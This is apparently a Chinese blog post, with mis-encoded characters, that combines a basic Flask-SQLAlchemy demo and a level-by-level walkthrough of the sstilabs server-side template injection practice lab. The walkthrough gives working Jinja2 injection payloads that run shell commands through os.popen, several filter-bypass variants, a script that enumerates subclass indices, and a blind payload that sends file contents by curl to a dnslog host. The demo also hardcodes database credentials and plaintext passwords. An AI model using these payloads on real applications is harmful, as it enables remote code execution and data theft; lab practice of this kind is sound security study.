class="line">å…¶ä»–é¡¹ç›®éœ€æ±‚ï¼šå¦‚æœæ‚¨åœ¨å…¶ä»–é¡¹ç›®ä¸­éœ€è¦ä½¿ç”¨PostgreSQLï¼Œé‚£ä¹ˆåœ¨Flaskåº”ç”¨ç¨‹åºä¸­ä¹Ÿé€‰æ‹©ä½¿ç”¨PostgreSQLå¯èƒ½ä¼šæ›´æ–¹ä¾¿ç»Ÿä¸€æ•°æ®åº“åç«¯ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰¾äº†ä¸ªç”¨MySQLçš„<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/146874556">Python Web å¼€å‘æ¡†æ¶Flaskå¿«é€Ÿå…¥é—¨ - çŸ¥ä¹</a><br><code>pip install flask-mysqldb</code></p>
<h3 id="ä½¿ç”¨-æœ€åŸºç¡€ç‰ˆğŸš¬ğŸš¬"><a href="#ä½¿ç”¨-æœ€åŸºç¡€ç‰ˆğŸš¬ğŸš¬" class="headerlink" title="ä½¿ç”¨(æœ€åŸºç¡€ç‰ˆğŸš¬ğŸš¬)"></a>ä½¿ç”¨(æœ€åŸºç¡€ç‰ˆğŸš¬ğŸš¬)</h3><p>è€æŠ¥é”™ï¼Œï¼ŒgptğŸ™ğŸ™ğŸ™</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-sql.py</span><br><span class="line">templates/</span><br><span class="line"><span class="code">    index.html</span></span><br></pre></td></tr></table></figure>

<p>flask-sql.pyæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¿æ¥æ•°æ®åº“çš„URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;mysql://root:root@127.0.0.1:3306/Flask_test&#x27;</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªrootæ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªrootæ˜¯å¯†ç </span></span><br><span class="line"><span class="comment"># ä½¿ç”¨å‰è®°å¾—å…ˆå»ºè¡¨ã€‚ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ¯æ¬¡è¯·æ±‚ç»“æŸåä¼šè‡ªåŠ¨æäº¤æ•°æ®åº“ä¸­çš„æ”¹åŠ¨</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_COMMIT_ON_TEARDOWN&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æ—¶ä¼šæ˜¾ç¤ºåŸå§‹SQLè¯­å¥</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_ECHO&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Role</span>(db.Model):</span><br><span class="line">    <span class="comment"># å®šä¹‰è¡¨å</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;roles&#x27;</span></span><br><span class="line">    <span class="comment"># å®šä¹‰åˆ—å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    us = db.relationship(<span class="string">&#x27;User&#x27;</span>, backref=<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    email = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    pswd = db.Column(db.String(<span class="number">64</span>))</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;roles.id&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># æŸ¥è¯¢æ‰€æœ‰è§’è‰²å’Œç”¨æˆ·</span></span><br><span class="line">    roles = Role.query.<span class="built_in">all</span>()</span><br><span class="line">    users = User.query.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, roles=roles, users=users)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># åˆ›å»ºæ‰€æœ‰æ•°æ®åº“è¡¨</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        <span class="comment"># ä¸€å¼€å§‹æ²¡è¿™å¥è€æŠ¥é”™</span></span><br><span class="line">        db.drop_all()</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ’å…¥æµ‹è¯•æ•°æ®</span></span><br><span class="line">        ro1 = Role(name=<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        ro2 = Role(name=<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        db.session.add_all([ro1, ro2])</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        us1 = User(name=<span class="string">&#x27;wang&#x27;</span>, email=<span class="string">&#x27;wang@163.com&#x27;</span>, pswd=<span class="string">&#x27;123456&#x27;</span>, role_id=ro1.<span class="built_in">id</span>)</span><br><span class="line">        us2 = User(name=<span class="string">&#x27;zhang&#x27;</span>, email=<span class="string">&#x27;zhang@189.com&#x27;</span>, pswd=<span class="string">&#x27;201512&#x27;</span>, role_id=ro2.<span class="built_in">id</span>)</span><br><span class="line">        us3 = User(name=<span class="string">&#x27;chen&#x27;</span>, email=<span class="string">&#x27;chen@126.com&#x27;</span>, pswd=<span class="string">&#x27;987654&#x27;</span>, role_id=ro2.<span class="built_in">id</span>)</span><br><span class="line">        us4 = User(name=<span class="string">&#x27;zhou&#x27;</span>, email=<span class="string">&#x27;zhou@163.com&#x27;</span>, pswd=<span class="string">&#x27;456789&#x27;</span>, role_id=ro1.<span class="built_in">id</span>)</span><br><span class="line">        db.session.add_all([us1, us2, us3, us4])</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>index.htmlæ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask-SQLAlchemy Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Roles:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% for role in roles %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; role.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Users:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% for user in users %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.name &#125;&#125; - &#123;&#123; user.email &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://127.0.0.1:5000/</code></p>
<h1 id="åˆ«çš„æ¨¡æ¿"><a href="#åˆ«çš„æ¨¡æ¿" class="headerlink" title="åˆ«çš„æ¨¡æ¿"></a>åˆ«çš„æ¨¡æ¿</h1><p>å…ˆå¹²sstiå»äº†ï¼Œï¼Œæœ‰ç¼˜å†è§<br>php<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/phpstudy2015-6/p/6216107.html">Smartyçš„åŸºæœ¬ä½¿ç”¨ä¸æ€»ç»“ - é‚£ä¸€å¶éšé£ - åšå®¢å›­</a><br>js<br><a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#docs">EJS â€“ åµŒå…¥å¼ JavaScript æ¨¡æ¿å¼•æ“ | EJS ä¸­æ–‡æ–‡æ¡£</a><br><img src="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg"></p>
<h1 id="sstilabs"><a href="#sstilabs" class="headerlink" title="sstilabs"></a>sstilabs</h1><p><a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">X3NNY&#x2F;sstilabs: A lab to help you learning SSTI</a></p>
<h2 id="å®‰è£…-2"><a href="#å®‰è£…-2" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>è¿›å…¥sstilabs-master\flasklabæ–‡ä»¶å¤¹<br><code>pip install -r requirements.txt</code></p>
<p><code>python app.py</code><br>ä¸€ç›´æŠ¥é”™<br>æŠŠrequirements.txtæ”¹æˆ<br><code>Flask&gt;=2.0.1</code><br>try again</p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>no waf</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ssti</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">post</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">`/level/<span class="subst">$&#123;get_level()&#125;</span>`</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: <span class="string">`code=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;input[name=&#x27;code&#x27;]&quot;</span>).val())&#125;</span>`</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            $(<span class="string">&quot;#res&quot;</span>).<span class="title function_">html</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹å‡ºæ¥æ˜¯postæ–¹å¼<br><code>code=&#123;&#123; ''.__class__  &#125;&#125;</code>â€“&gt;<code>&#123;&#123; ''.__class__  &#125;&#125;</code>è¯¥å®ä¾‹çš„å¯¹åº”çš„ç±»</p>
<p><code>code=&#123;&#123; ''.__class__.__base__  &#125;&#125;</code>â€“&gt;<code>&lt;class &#39;object&#39;&gt;</code>å½“å‰ç±»çš„çˆ¶ç±»</p>
<p><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()  &#125;&#125;</code>â€“&gt;åŒ…å«å½“å‰ç±»æ‰€æœ‰å­ç±»çš„ä¸€ä¸ªåˆ—è¡¨</p>
<p>æ‰¾åˆ°äº†ä¸ªgetçš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">400</span>):</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:5000/ssti?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    response=res.get(url%i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(response.text),i,response.status_code)</span><br></pre></td></tr></table></figure>
<p>chatè€å¸ˆæ”¹äº†ä¸ªpostçš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/level/1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>: payload % i&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(response.text), i, response.status_code)</span><br></pre></td></tr></table></figure>
<p>æ¯è¡Œä¸‰ä¸ªæ•°å­—å¯¹åº”ï¼šå“åº”åŒ…ï¼Œä¸‹æ ‡ï¼ŒçŠ¶æ€ç <br>æœ‰å¥½å¤šã€‚ã€‚éšæœºé€‰ä¸€ä¸ª104<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__ &#125;&#125;</code><br>é€‰æ‹©__import__<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__'] &#125;&#125;</code><br>ç„¶åæœ‰<code>&lt;function __import__ at 0x000002BFB1BC3F60&gt;</code></p>
<p>æ‰€ä»¥<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('type .\\flag').read() &#125;&#125;</code></p>
<p>æˆ‘æœäº†ä¸€ä¸‹åˆ«äººçš„wpåŸºæœ¬éƒ½æ˜¯bpåšçš„ï¼Œbutæˆ‘ç”µè„‘åäº†ä¹‹åbpè¿˜æ²¡è£…å›æ¥ï¼Œä¹Ÿæ‡’å¾—å¼€è™šæ‹Ÿæœºã€‚ã€‚æ‰€ä»¥å…ˆå‡‘åˆå‡‘åˆğŸ‘ğŸ¥º<br>æ„Ÿè§‰æˆ‘çš„åšæ³•æœ‰ä¸€ç§æ·³æœ´çš„ç¾ï¼Œä¸æ‡‚çš„æ°¸åˆ«äº†ã€‚ã€‚ã€‚ï¼</p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>è¿‡æ»¤äº†ä¸¤ä¸ªèŠ±æ‹¬å·ï¼Œç”¨print<br><code>&#123;%print ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('type .\\flag').read()%&#125;</code></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>no wafä½†æ˜¯ç›²æ³¨ã€‚ã€‚<br>å¥½åƒæœ‰ä¸¤ç§åŠæ³•ncå‘½ä»¤å°†æ–‡ä»¶å†…å®¹&#x2F;dnslogå¤–å¸¦ã€‚ã€‚</p>
<hr>
<p>è¿‡äº†ä¸€å¤©ã€‚ã€‚ç¾å¥½çš„ä¸€å¤©ä»æ”¾å¼ƒ*ctfå¼€å§‹<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('curl http://xxxxxx.ceye.io/`type .\\flag`').read() &#125;&#125;</code></p>
<p><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('curl http://xxxxxx.ceye.io/%25%36%30%25%37%34%25%37%39%25%37%30%25%36%35%25%32%30%25%32%65%25%35%63%25%35%63%25%36%36%25%36%63%25%36%31%25%36%37%25%36%30').read() &#125;&#125;</code><br>æˆ‘ä¸æ˜ç™½ã€‚ã€‚Remote Addrå¤„æ˜¾ç¤º<br><code>http://xxxxxx.ceye.io/`type ./flag` </code><br>å˜ï¼Œä½ ç»™æˆ‘å˜å•Šï¼ˆå¤§å£°</p>
<p>ç‰¹åˆ«ç‰¹åˆ«ç»æœ›ï¼Œï¼Œå…ˆåšä¸‹ä¸€é¢˜äº†</p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>è¿‡æ»¤ä¸­æ‹¬å·<br>__getitem__ç»•ä¸­æ‹¬å·é™åˆ¶<br><code>&#39;&#39;.__class__.__base__.__subclasses__()[104]</code>&#x3D;<code>&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(104)</code></p>
<p><code>()[&quot;__class__&quot;]</code>&#x3D;<code>()|attr(&quot;__class__&quot;)</code>&#x3D;<code>().__getattribute__(&quot;__class__&quot;)</code></p>
<p><code>[&#39;__import__&#39;]</code>&#x3D;<code>.__getitem__(&#39;__import__&#39;)</code></p>
<p>psyload<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__().__getitem__(104).__init__.__globals__.__getitem__('__import__')('os').popen('type .\\flag').read() &#125;&#125;</code></p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è¿‡æ»¤äº†å•åŒå¼•å·<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/359392.html">è¯¦è§£Flask SSTI åˆ©ç”¨ä¸ç»•è¿‡æŠ€å·§V2 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<blockquote>
<p>è¿‡æ»¤å¼•å·</p>
<p>requestå¯¹è±¡ç»•è¿‡<br>requestæœ‰ä¸¤ç§å½¢å¼ï¼Œrequest.argså’Œrequest.valuesï¼ŒPOSTå’ŒGETä¼ é€’çš„æ•°æ®éƒ½å¯ä»¥è¢«æ¥æ”¶ã€‚<br><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()&#125;&#125;&amp;v1=os&amp;v2=whoami</code></p>
<p>chrç»•è¿‡<br>GETè¯·æ±‚æ—¶ï¼Œ+å·è®°å¾—urlç¼–ç ï¼Œè¦ä¸ä¼šè¢«å½“ä½œç©ºæ ¼å¤„ç†ã€‚<br><code>?name=&#123;% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()&#125;&#125;</code></p>
</blockquote>
<p>æœ¬é¢˜payload<br><code>code=&#123;&#123; [].__class__.__base__.__subclasses__()[104].__init__.__globals__[request.values.arg1](request.values.arg2).popen(request.values.arg3).read() &#125;&#125;&amp;arg1=__import__&amp;arg2=os&amp;arg3=type .\\flag</code></p>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>è¿‡æ»¤ä¸‹åˆ’çº¿</p>
<ul>
<li>åå…­ä½ç¼–ç <br><code>code=&#123;&#123; ''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[104]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['\x5f\x5fimport\x5f\x5f']('os').popen('type .\\flag').read()&#125;&#125;</code></li>
</ul>
<p>è¿˜æœ‰</p>
<ul>
<li>Unicodeç¼–ç </li>
<li>attr()é…åˆrequest</li>
</ul>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>è¿‡æ»¤<code>.</code><br>é—®å°±æ˜¯æ”¹æ”¹ä¸Šä¸€é¢˜<br><code>code=&#123;&#123; ''["__class__"]["__base__"]["__subclasses__"]()[104]["__init__"]["__globals__"]['__import__']('os')['popen']('type \x2e\\flag')['read']()&#125;&#125;</code></p>
<p>è¿˜æœ‰</p>
<ul>
<li>attr()</li>
</ul>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>è¿‡æ»¤å…³é”®å­—<code>[&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;]</code></p>
<p>æ‹¼æ¥å­—ç¬¦<br><code>code=&#123;&#123; ''["__cl"+"ass__"]["__ba"+"se__"]["__subcla"+"sses__"]()[104]["__in"+"it__"]["__glo"+"bals__"]['__import__']('os')['pop'+'en']('type \x2e\\flag')['read']()&#125;&#125;</code></p>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>è¿‡æ»¤æ•°å­—<br>å·å·æŠ„æŠ„æ”¹æ”¹åˆ«äººçš„</p>
<ul>
<li><p>for<br><code>&#123;% for i in (''.__class__.__mro__|last()).__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type .\\flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
</li>
<li><p>lipsum<br><code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type .\\flag")|attr("read")()&#125;&#125;</code></p>
</li>
<li><p>æ„é€ æ•°å­—<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ„é€ æ•°å­—ä¸æˆåŠŸã€‚ã€‚</p>
<ul>
<li>åšåˆ°level11å›æ¥çœ‹ä¸€çœ¼<br> <code>&#123;% set yi=dict(a=a)|join|count %&#125;&#123;% set er=dict()|join|count %&#125;&#123;% set san=dict(aaaaa=a)|join|count %&#125;&#123;% set zh=(yi~er~san)|int %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[zh].__init__.__globals__['__import__']('os').popen('type .\\flag').read()&#125;&#125;</code><br> æˆåŠŸ</li>
</ul>
</li>
</ul>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>WAF: set config &#x3D; None</p>
<p>target: get config</p>
<p>å»çœ‹äº†åˆ«äººçš„wp</p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘url_forä¸æˆåŠŸ<br>ä½†æ˜¯<br>get_flashed_messagesæˆåŠŸäº†</p>
<p><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p>
<p>æˆ‘çœ‹äº†çœ¼<code>&#123;&#123;url_for.__globals__&#125;&#125;</code>ï¼Œå®ƒå°±æ²¡æœ‰â€™current_appâ€™</p>
<h2 id="level11-13"><a href="#level11-13" class="headerlink" title="level11-13"></a>level11-13</h2><p>ä»¥ä¸‹å°±æ˜¯è·Ÿç€åˆ«äººçš„wpè¿‡ä¸€é<br><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LABæ”»ç•¥ â€“ JohnFrodâ€™s Blog</a></p>
<p><code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type /x2e\\flag")|attr("read")()&#125;&#125;</code></p>
<h3 id="è¿‡æ»¤ä¸‹åˆ’çº¿-x2F-ç©ºæ ¼"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿-x2F-ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿&#x2F;ç©ºæ ¼"></a>è¿‡æ»¤ä¸‹åˆ’çº¿&#x2F;ç©ºæ ¼</h3><p>ç”¨<code>&#123;&#123;(lipsum|string|list)&#125;&#125;</code>è·å–<br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg"><img src="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg"></a><br>ä¸‹æ ‡18ä¸ºä¸‹åˆ’çº¿ï¼Œä¸‹æ ‡9ä¸ºç©ºæ ¼</p>
<p><code>&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</code></p>
<p><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</code></p>
<h3 id="attr-å†…å­—ç¬¦ä¸²æ„é€ "><a href="#attr-å†…å­—ç¬¦ä¸²æ„é€ " class="headerlink" title="attr()å†…å­—ç¬¦ä¸²æ„é€ "></a>attr()å†…å­—ç¬¦ä¸²æ„é€ </h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ„é€ ç±»"><a href="#æ„é€ ç±»" class="headerlink" title="æ„é€ ç±»"></a>æ„é€ ç±»</h3><p><code>&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</code><br><code>&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</code></p>
